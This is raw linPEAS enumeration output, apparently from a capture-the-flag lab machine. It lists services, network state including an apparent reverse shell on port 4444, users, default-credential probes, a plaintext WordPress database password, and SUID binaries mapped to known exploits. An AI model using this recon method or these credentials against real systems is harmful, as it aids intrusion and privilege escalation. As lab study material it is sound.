-rwxr-xr-x   1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb  3 18:22 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb  3 18:22 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Feb  3 18:24 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions
 [ - ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  mysql
 [ + ]  nmbd
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  samba-ad-dc
 [ - ]  screen-cleanup
 [ + ]  smbd
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/var/www/wordpress/wp-includes/certificates/ca-bundle.crt
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
Sun 2020-07-19 14:09:00 UTC  26min left Sun 2020-07-19 13:39:21 UTC  2min 57s ago phpsessionclean.timer        phpsessionclean.service
Mon 2020-07-20 00:00:00 UTC  10h left   Sun 2020-07-19 13:06:06 UTC  36min ago    fstrim.timer                 fstrim.service
Mon 2020-07-20 04:03:19 UTC  14h left   Sun 2020-07-19 13:06:06 UTC  36min ago    apt-daily.timer              apt-daily.service
Mon 2020-07-20 04:54:38 UTC  15h left   Sun 2020-07-19 13:06:06 UTC  36min ago    motd-news.timer              motd-news.service
Mon 2020-07-20 06:37:39 UTC  16h left   Sun 2020-07-19 13:06:06 UTC  36min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2020-07-20 13:21:10 UTC  23h left   Sun 2020-07-19 13:21:10 UTC  21min ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a        n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a        n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
blog
127.0.0.1 localhost
127.0.0.1 blog.thm
127.0.1.1 blog

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.180.207  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::a4:65ff:fe39:fbfa  prefixlen 64  scopeid 0x20<link>
        ether 02:a4:65:39:fb:fa  txqueuelen 1000  (Ethernet)
        RX packets 55829  bytes 10882868 (10.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 55769  bytes 14677416 (14.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 407  bytes 47618 (47.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 407  bytes 47618 (47.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
ip-10-10-0-1.eu 0.0.0.0         255.255.255.255 UH    100    0        0 eth0

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 10.10.180.207:42194     10.10.132.51:4444       ESTABLISHED 1824/sh
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -
tcp6       1      0 10.10.180.207:80        10.10.132.51:34317      CLOSE_WAIT  -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.10.180.207:68        0.0.0.0:*                           -
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -
udp        0      0 10.10.180.207:137       0.0.0.0:*                           -
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -
udp        0      0 10.10.180.207:138       0.0.0.0:*                           -
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Do I have PGP keys?
gpg Not Found

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
bjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(bjoel) gid=1000(bjoel) groups=1000(bjoel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
uid=1001(smb) gid=1001(smb) groups=1001(smb)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon) groups=1(daemon)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 13:42:26 up 36 min,  0 users,  load average: 0.21, 0.05, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
reboot   system boot  4.15.0-101-gener Tue May 26 17:52 - 18:18  (00:26)
root     tty1                          Tue May 26 15:21 - down   (01:16)
reboot   system boot  4.15.0-101-gener Tue May 26 15:18 - 16:38  (01:19)
root     pts/0        192.168.196.1    Tue May 26 03:14 - down   (01:03)
root     tty1                          Tue May 26 03:01 - down   (01:16)
reboot   system boot  4.15.0-101-gener Tue May 26 03:01 - 04:17  (01:16)
bjoel    tty1                          Mon May 25 13:15 - down   (00:00)
reboot   system boot  4.15.0-101-gener Mon May 25 13:15 - 13:16  (00:01)

wtmp begins Mon May 25 13:15:12 2020

[+] Last time logon each user
Username         Port     From             Latest
root             tty1                      Mon Jun  1 13:49:55 +0000 2020
bjoel            tty1                      Mon May 25 13:15:56 +0000 2020

[+] Password policy
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Looking for mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2020-03-13T12:26:16

[+] Looking for PHPCookies
 Not Found

[+] Looking for Wordpress wp-config.php files
wp-config.php files found:
/var/www/wordpress/wp-config.php
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');

[+] Looking for Drupal settings.php files
/default/settings.php Not Found

[+] Looking for Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Looking for supervisord configuration file
supervisord.conf Not Found

[+] Looking for cesi configuration file
cesi.conf Not Found

[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found

[+] Looking for wifi conns file
 Not Found

[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Looking for .vnc directories and their passwd files
.vnc Not Found

[+] Looking for ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found

[+] Looking for ssl/ssh files
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found (out limited):
/etc/apache2/sites-enabled
/etc/pollinate/entropy.ubuntu.com.pem

 --> /etc/hosts.allow file found, read the rules:



Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No

[+] Looking for Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
cat: /etc/krb5.conf: No such file or directory
tickets kerberos Not Found
klist Not Found

[+] Looking for Kibana yaml
kibana.yml Not Found

[+] Looking for Knock configuration
Knock.config Not Found

[+] Looking for logstash files
 Not Found

[+] Looking for elasticsearch files
 Not Found

[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Looking for AD cached hashes
-rw------- 1 root root 430080 May 26 17:55  /var/lib/samba/private/secrets.tdb

[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-www-data.

[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Looking for Couchdb directory

[+] Looking for redis.conf

[+] Looking for dovecot files
dovecot credentials Not Found

[+] Looking for mosquitto.conf

[+] Looking for neo4j auth file

[+] Looking Cloud-Init conf file
Found readable /etc/cloud/cloud.cfg
     lock_passwd: True
     groups: [adm, audio, cdrom, dialout, dip, floppy, lxd, netdev, plugdev, sudo, video]
     sudo: ["ALL=(ALL) NOPASSWD:ALL"]


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/passwd         --->    Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec         --->    Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/sudo           --->    /sudo$
/usr/bin/at             --->    RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount              --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/fusermount
/bin/umount             --->    BSD/Linux(08-1996)
/bin/ping
/bin/su
/snap/core/8268/bin/mount               --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount              --->    BSD/Linux(08-1996)
/snap/core/8268/usr/bin/chfn            --->    SuSE_9.3/10
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp          --->    HP-UX_10.20
/snap/core/8268/usr/bin/passwd          --->    Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core/8268/usr/bin/sudo            --->    /sudo$
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd           --->    Apple_Mac_OSX_10.4.8(05-2007)
/snap/core/9066/bin/mount               --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount              --->    BSD/Linux(08-1996)
/snap/core/9066/usr/bin/chfn            --->    SuSE_9.3/10
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp          --->    HP-UX_10.20
/snap/core/9066/usr/bin/passwd          --->    Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core/9066/usr/bin/sudo            --->    /sudo$
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd           --->    Apple_Mac_OSX_10.4.8(05-2007)

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/mlocate
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/wall
/usr/bin/at             --->    RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd
/snap/core/8268/sbin/pam_extrausers_chkpwd
/snap/core/8268/sbin/unix_chkpwd
/snap/core/8268/usr/bin/chage
/snap/core/8268/usr/bin/crontab
/snap/core/8268/usr/bin/dotlockfile
/snap/core/8268/usr/bin/expiry
/snap/core/8268/usr/bin/mail-lock
/snap/core/8268/usr/bin/mail-touchlock
/snap/core/8268/usr/bin/mail-unlock
/snap/core/8268/usr/bin/ssh-agent
/snap/core/8268/usr/bin/wall
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/9066/sbin/pam_extrausers_chkpwd
/snap/core/9066/sbin/unix_chkpwd
/snap/core/9066/usr/bin/chage
/snap/core/9066/usr/bin/crontab
/snap/core/9066/usr/bin/dotlockfile
/snap/core/9066/usr/bin/expiry
/snap/core/9066/usr/bin/mail-lock
/snap/core/9066/usr/bin/mail-touchlock
/snap/core/9066/usr/bin/mail-unlock
/snap/core/9066/usr/bin/ssh-agent
/snap/core/9066/usr/bin/wall

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities

[+] .sh files in path
/usr/bin/gettext.sh

[+] Unexpected folders in root
/cdrom

[+] Files (scripts) in /etc/profile.d/
total 36
drwxr-xr-x   2 root root 4096 Feb  3 18:24 .
drwxr-xr-x 100 root root 4096 Jun  1 14:28 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  825 Oct 30  2019 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Looking for root files in home dirs (limit 20)
/home
/home/bjoel/.bash_history

[+] Looking for others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins
/var/www/wordpress/linpeas.sh
/var/log/syslog
/var/log/kern.log
/var/log/journal/a48aa1b7b471491790e2497ef04d3ae8/system.journal
/var/log/auth.log

[+] Writable log files (logrotten)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

[+] Files inside /home/www-data (limit 20)

[+] Files inside others home (limit 20)
/home/bjoel/.sudo_as_admin_successful
/home/bjoel/Billy_Joel_Termination_May20-2020.pdf
/home/bjoel/user.txt
/home/bjoel/.bashrc
/home/bjoel/.profile
/home/bjoel/.bash_logout

[+] Looking for installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rw-r----- 1 www-data www-data 235 May 28 03:44 /var/www/wordpress/.htaccess_backup
-rw-r--r-- 1 root root 2765 Feb  3 18:24 /etc/apt/sources.list.curtin.old
-rwxr-xr-x 1 root root 14328 Oct 26  2017 /usr/bin/tdbbackup.tdbtools

[+] Looking for tables inside readable .db/.sqlite files (limit 100)

[+] Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K May 26 03:32 .
drwxr-xr-x 14 root     root     4.0K May 26 03:14 ..
drwxr-xr-x  2 root     root     4.0K May 26 03:14 html
drwxr-x---  5 www-data www-data 4.0K Jul 19 13:38 wordpress

/var/www/html:
total 20K
drwxr-xr-x 2 root root 4.0K May 26 03:14 .

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
lrwxrwxrwx 1 root root 41 May 26 03:02 /etc/systemd/system/vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
lrwxrwxrwx 1 root root 9 May 26 18:18 /home/bjoel/.bash_history -> /dev/null
Looking for possible passwords inside /home/bjoel/.bash_history

-rw-r--r-- 1 bjoel bjoel 3771 Apr  4  2018 /home/bjoel/.bashrc
-rw-r--r-- 1 bjoel bjoel 807 Apr  4  2018 /home/bjoel/.profile
-rw-r--r-- 1 bjoel bjoel 0 May 25 13:16 /home/bjoel/.sudo_as_admin_successful
-rwxr-xr-x 1 root root 1814 Oct 12  2017 /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config
-rw-r--r-- 1 root root 3106 Sep 27  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 37 Jul 19 13:06 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jul 19 13:05 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 bjoel bjoel 220 Apr  4  2018 /home/bjoel/.bash_logout
-rw-r--r-- 1 root root 252 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 364 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 280 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 276 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 252 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 275 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 280 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 300 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 1664 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
-rw-r--r-- 1 root root 7839 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.sha256.o.cmd
-rw-r--r-- 1 root root 1524 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.stack.o.cmd
-rw-r--r-- 1 root root 1544 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.entry64.o.cmd
-rw-r--r-- 1 root root 155 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
-rw-r--r-- 1 root root 359 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.purgatory.ro.cmd
-rw-r--r-- 1 root root 11281 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.purgatory.o.cmd
-rw-r--r-- 1 root root 4731 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/purgatory/.string.o.cmd
-rw-r--r-- 1 root root 60057 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 4624 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 4645 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 146 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 4645 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 217460 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/.config.old
-rw-r--r-- 1 root root 13823 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 8304 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.elf.o.cmd
-rw-r--r-- 1 root root 7798 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.special.o.cmd
-rw-r--r-- 1 root root 464 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/arch/x86/.objtool-in.o.cmd
-rw-r--r-- 1 root root 8571 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/arch/x86/.decode.o.cmd
-rw-r--r-- 1 root root 6307 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.exec-cmd.o.cmd
-rw-r--r-- 1 root root 1283 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.libsubcmd-in.o.cmd
-rw-r--r-- 1 root root 1841 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.objtool-in.o.cmd
